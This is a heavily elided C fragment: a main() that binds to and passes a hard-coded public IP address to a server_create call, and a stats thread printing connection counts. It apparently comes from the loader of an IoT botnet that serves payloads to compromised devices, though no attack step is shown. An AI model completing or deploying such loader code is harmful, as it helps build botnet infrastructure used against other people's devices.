...
int main(int argc, char **args)
{
    ...
    addrs[0] = inet_addr("209.97.189.40"); // Address to bind to
    ...
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "209.97.189.40", 80, "209.97.189.40")) == NULL)
    {
...
static void *stats_thread(void *arg)
{
    ...
    {
#ifndef DEBUG
        printf("\033[33;1mTime: %dsecs\tConns: %d\n",
